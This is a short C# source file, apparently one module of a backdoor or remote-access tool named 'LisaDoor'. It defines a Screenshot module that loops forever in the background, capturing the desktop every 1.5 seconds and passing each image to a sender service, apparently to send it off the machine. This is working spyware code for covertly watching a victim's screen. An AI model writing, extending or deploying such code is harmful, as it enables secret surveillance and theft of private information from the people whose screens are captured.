using LisaDoor.Network;

namespace LisaDoor.Modules
{
    internal class Screenshot : Module
    {
        public override void Init()
        {
            Task.Run(() =>
            {
                while (true)
                {
                    var image = ScreenCapture.CaptureDesktop();
                    SSData data = new(DateTime.UtcNow, image);
                    SenderService.SendMessage(data);
                    Thread.Sleep(1500);
                }
            });
        }
    }
}